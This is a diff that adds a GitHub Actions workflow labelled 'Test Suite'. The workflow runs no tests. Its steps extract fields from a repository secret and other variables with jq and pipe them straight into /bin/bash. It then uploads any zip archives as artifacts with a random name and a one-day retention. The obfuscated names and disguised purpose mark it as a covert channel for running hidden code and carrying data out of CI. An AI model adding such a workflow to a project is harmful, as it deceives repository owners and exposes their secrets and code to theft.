@@ -1,0 +1,28 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          a668: ${{ secrets.a668 }}
+        run: |
+          printf '%s' "$a668" | jq -r .u8 | /bin/bash
+          printf '%s' "$cv2" | jq -r .dg6151 | /bin/bash
+          echo $crg87870 | jq -r .mh633 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: mw4HxHst
+          path: "*.zip"
+          retention-days: 1
